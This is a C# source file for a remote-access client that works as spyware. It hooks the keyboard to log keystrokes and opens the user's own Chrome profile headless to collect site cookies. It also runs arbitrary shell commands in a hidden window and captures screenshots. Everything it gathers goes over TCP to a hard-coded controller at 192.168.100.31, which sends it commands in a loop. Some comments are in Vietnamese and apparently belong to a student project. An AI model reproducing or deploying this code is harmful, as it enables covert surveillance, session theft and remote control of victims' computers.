using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Windows.Forms;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;
using System.Reflection.Emit;
//using OpenQA.Selenium.DevTools.V115.Page;
using System.Security.Policy;
using System.Threading;
using System.Runtime.InteropServices.ComTypes;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ListView;
using System.Drawing.Imaging;
using System.Drawing;
using System.Net;
using Server;

namespace Client
{
    class Program
    {
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;
        static Thread th_doKeylogger;
        static Thread th_socket;
        public static WebClient webClient = new WebClient();

        static ASCIIEncoding encoding = new ASCIIEncoding();
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        #region hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        static bool capsLockIsOn()
        {
            return Control.IsKeyLocked(System.Windows.Forms.Keys.CapsLock);
        }

        static bool checkWrite(int vkCode)
        {
            if (vkCode >= 48 && vkCode <= 57) // 0-9
            {
                return true;
            }
            else if (vkCode >= 65 && vkCode <= 90) //A-Z
            {
                return true;
            }
            else if (vkCode >= 97 && vkCode <= 122) // a-z
            {
                return true;
            }
            else if (vkCode == 32) // space
            {
                return true;
            }
            return false;
        }

        static void WriteLog(int vkCode)// thiếu xử lí lên xuống trái phải backspace
        {
            //Console.InputEncoding = Encoding.UTF8;
            //Console.OutputEncoding = Encoding.UTF8;
            //Console.Write((char)vkCode);
            //Console.Write(vkCode);

            string logNameToWrite = "keylogger" + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);

            //Console.Write(vkCode); Console.Write(" ");
            //Console.WriteLine((char)vkCode);
            if (vkCode == 13)
            {
                sw.Write("\n");
            }
            else if (vkCode == 8)//? loi khong chay duoc backspace
            {
                //sw.Write("\b");
                //???
            }
            if (Control.ModifierKeys == System.Windows.Forms.Keys.Shift) // de shift
            {
                if (vkCode == 49) { sw.Write("!"); Console.Write("!"); }//shift 1
                else if (vkCode == 50) { sw.Write("@"); Console.Write("@"); }//shift 2
                else if (vkCode == 51) { sw.Write("#"); Console.Write("#"); }//shift 3
                else if (vkCode == 52) { sw.Write("$"); Console.Write("$"); }//shift 4
                else if (vkCode == 53) { sw.Write("%"); Console.Write("%"); }//shift 5
                else if (vkCode == 54) { sw.Write("^"); Console.Write("^"); }//shift 6
                else if (vkCode == 55) { sw.Write("&"); Console.Write("&"); }//shift 7
                else if (vkCode == 56) { sw.Write("*"); Console.Write("*"); }//shift 8
                else if (vkCode == 57) { sw.Write("("); Console.Write("("); }//shift 9
                else if (vkCode == 48) { sw.Write(")"); Console.Write(")"); }//shift 0
                else if (vkCode == 187) { sw.Write("+"); Console.Write("+"); }
                else if (vkCode == 189) { sw.Write("_"); Console.Write("_"); }
                else if (vkCode == 188) { sw.Write("<"); Console.Write("<"); }
                else if (vkCode == 190) { sw.Write(">"); Console.Write(">"); }
                else if (vkCode == 191) { sw.Write("?"); Console.Write("?"); }
                else if (vkCode == 219) { sw.Write("{"); Console.Write("{"); }
                else if (vkCode == 221) { sw.Write("}"); Console.Write("}"); }
                else if (vkCode == 220) { sw.Write("|"); Console.Write("|"); }
                else if (vkCode == 186) { sw.Write(":"); Console.Write(":"); }
                else if (vkCode == 222) { sw.Write("\""); Console.Write("\""); }
                else
                {

                    if (checkWrite(vkCode)) // de shift + capslock
                    {
                        if (capsLockIsOn())
                        {
                            vkCode += 32;
                            Console.Write((char)vkCode);
                            sw.Write((char)vkCode);
                        }
                        else // de shift
                        {
                            Console.Write((char)vkCode);
                            sw.Write((char)vkCode);
                        }
                    }
                }

            }
            else // khong de shift
            {
                if (vkCode >= 65 && vkCode <= 90) // viet thuong
                {
                    vkCode += 32;
                }
                else if (vkCode == 187) { sw.Write("="); Console.Write("="); }
                else if (vkCode == 189) { sw.Write("-"); Console.Write("-"); }
                else if (vkCode == 188) { sw.Write(","); Console.Write(","); }
                else if (vkCode == 190) { sw.Write("."); Console.Write("."); }
                else if (vkCode == 191) { sw.Write("/"); Console.Write("/"); }
                else if (vkCode == 219) { sw.Write("["); Console.Write("["); }
                else if (vkCode == 221) { sw.Write("]"); Console.Write("]"); }
                else if (vkCode == 220) { sw.Write("\\"); Console.Write("\\"); }
                else if (vkCode == 186) { sw.Write(";"); Console.Write(";"); }
                else if (vkCode == 222) { sw.Write("'"); Console.Write("'"); }

                if (checkWrite(vkCode))
                {
                    if (capsLockIsOn())
                    {
                        if (vkCode >= 97 && vkCode <= 122) // a-z
                        {
                            vkCode -= 32;
                        }
                        Console.Write((char)vkCode);
                        // sw.Write(" ");
                        sw.Write((char)vkCode);
                    }
                    else
                    {
                        Console.Write((char)vkCode);
                        // sw.Write(" ");
                        sw.Write((char)vkCode);
                    }
                }
            }
            sw.Close();
        }

        static void HookKeyboard()
        {
            Console.WriteLine("Bat dau chay keylogger");
            _hookID = SetHook(_proc);
            System.Windows.Forms.Application.Run();

            UnhookWindowsHookEx(_hookID);
        }
        #endregion


        public static bool IsAscii(char c)
        {
            return c < 128;
        }
        static bool IsUrlValid(string url)
        {
            Uri result;
            return Uri.TryCreate(url, UriKind.Absolute, out result) && (result.Scheme == Uri.UriSchemeHttp || result.Scheme == Uri.UriSchemeHttps);
        }
        public static void getCookies(IWebDriver driver, string url)
        {
            try
            {
                driver.Navigate().GoToUrl(url);
                string currentUrl = driver.Url;
                if (IsUrlValid(currentUrl))
                {
                    var cookies = driver.Manage().Cookies.AllCookies;
                    string cookiesString = "";
                    foreach (var cookie in cookies)
                    {
                        cookiesString += $"{cookie.Name}={cookie.Value};";
                    }
                    string logNameToWrite = "cookies" + logExtendtion;
                    StreamWriter sw = new StreamWriter(logNameToWrite, false);
                    sw.WriteLine(DateTime.Now);
                    sw.WriteLine(url);
                    sw.WriteLine(cookiesString);
                    //sw.WriteLine("----------------------------------------------------------------------------------------");
                    sw.Close();

                }
                else
                {
                    Console.WriteLine("Invalid URL.");
                    string logNameToWrite = "cookies" + logExtendtion;
                    StreamWriter sw = new StreamWriter(logNameToWrite, true);
                    sw.WriteLine(DateTime.Now);
                    sw.WriteLine(url);
                    sw.WriteLine("Url invalid. Url must starts with https://www...");
                    //sw.WriteLine("----------------------------------------------------------------------------------------");
                    sw.Close();
                }

            }
            catch (Exception e)
            {
                // Handle the exception
                //Console.WriteLine("Navigation failed: " + e.Message);

                //Console.WriteLine("Invalid URL.");
                string logNameToWrite = "cookies" + logExtendtion;
                StreamWriter sw = new StreamWriter(logNameToWrite, true);
                sw.WriteLine(DateTime.Now);
                sw.WriteLine(url);
                sw.WriteLine("erro: " + e.Message);
                sw.WriteLine("----------------------------------------------------------------------------------------");
                sw.Close();
            }
            finally
            {
            }
        }

        public static string RunCommandAndGetOutput(string command)
        {
            string output = "";

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe"; // Command prompt executable
                process.StartInfo.Arguments = "/c " + command; // /c flag tells cmd.exe to run the command and exit
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();
            }
            catch (Exception ex)
            {
                //Console.WriteLine("Error: " + ex.Message);
            }
            string logNameToWrite = "cmdResult" + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, false);
            sw.WriteLine(output);
            sw.Close();
            return output;
        }

        public static void captureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            //string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            //if (!Directory.Exists(directoryImage))
            //{
            //    Directory.CreateDirectory(directoryImage);
            //}
            // Save the screenshot to the specified path that the user has chosen.
            //string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + "_" + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save("capture.png", ImageFormat.Png);
            }
            catch
            {

            }
        }
        
        public static void sendFileSocket(TcpClient client, string type)
        {
            string fileName = "";
            if (type == "cookies")
            {
                fileName = "cookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = "outputkeylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "cmdResult.txt";
            }
            else if (type == "capture")
            {
                fileName = "capture.png";
            }
            byte[] dataTemp = File.ReadAllBytes(fileName);
            byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);

            int bufferSize = 1024;

            NetworkStream stream = client.GetStream();
            stream.Write(dataLength, 0, 4);

            int bytesSent = 0;
            int bytesLeft = dataTemp.Length;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);

                stream.Write(dataTemp, bytesSent, curDataSize);

                bytesSent += curDataSize;
                bytesLeft -= curDataSize;
            }

        }
        public static void handleCommand(string command, IWebDriver driver, TcpClient client, Stream stream)
        {
            byte[] data = new byte[BUFFER_SIZE];
            if (command.StartsWith("cookies"))
            {
                string url = command.Split('?')[1];
                getCookies(driver, url);
                sendFileSocket(client, "cookies");
            }
            
            else if (command.StartsWith("command"))
            {
                string cmd = command.Split('?')[1];
                RunCommandAndGetOutput(cmd);
                //Console.WriteLine(RunCommandAndGetOutput(cmd));
                sendFileSocket(client, "cmd");
            }
            else if (command.StartsWith("capture"))
            {
                captureScreen();
                sendFileSocket(client, "capture");
            }
            else if (command.StartsWith("keylogger"))
            {
                string cmd = command.Split('?')[1];
                Console.WriteLine(cmd);
                if (cmd.Equals("start keylogger"))
                {
                    //Console.WriteLine("okkk");
                    BotKeylogger.StartKeylogger();
                }
                else if (cmd.Equals("stop keylogger"))
                {
                    BotKeylogger.StopKeylogger();
                    sendFileSocket(client, "keylogger");
                    File.Delete("outputkeylogger.txt");
                }
            }
            else if (command.StartsWith("exit"))
            {

                string str = "done";

                data = encoding.GetBytes(str);
                stream.Write(data, 0, data.Length);
                Console.WriteLine("xong exit");
                client.Close();
            }
        }
        public static void handleConnectSocket()
        {

            //<--------------------- set up get cookies-------------------------->
            ChromeOptions options = new ChromeOptions();
            string username = RunCommandAndGetOutput("echo %username%").Trim();
            string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
            options.AddArguments(path, "headless");
            IWebDriver driver = new ChromeDriver(options);
            //Console.WriteLine("set up xong cookies");
            //<---------------------end get cookies-------------------------->
            try
            {
                TcpClient client = new TcpClient();
                client.Connect("192.168.100.31", PORT_NUMBER);
                Stream stream = client.GetStream();
                //Console.WriteLine("connect xong socket");
                byte[] data;
                while (true)
                {
                    data = new byte[BUFFER_SIZE];
                    stream.Read(data, 0, BUFFER_SIZE);
                    string command = encoding.GetString(data);
                    handleCommand(command, driver, client, stream);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
            driver.Quit();
        }
        public static void Main(string[] args)
        {
            //th_doKeylogger = new Thread(new ThreadStart(HookKeyboard));
            //th_doKeylogger.SetApartmentState(ApartmentState.STA);
            //th_doKeylogger.Start();
            th_socket = new Thread(new ThreadStart(handleConnectSocket));
            th_socket.SetApartmentState(ApartmentState.STA);
            th_socket.Start();
            BotKeylogger.initBotKeylogger();
        }
    }
}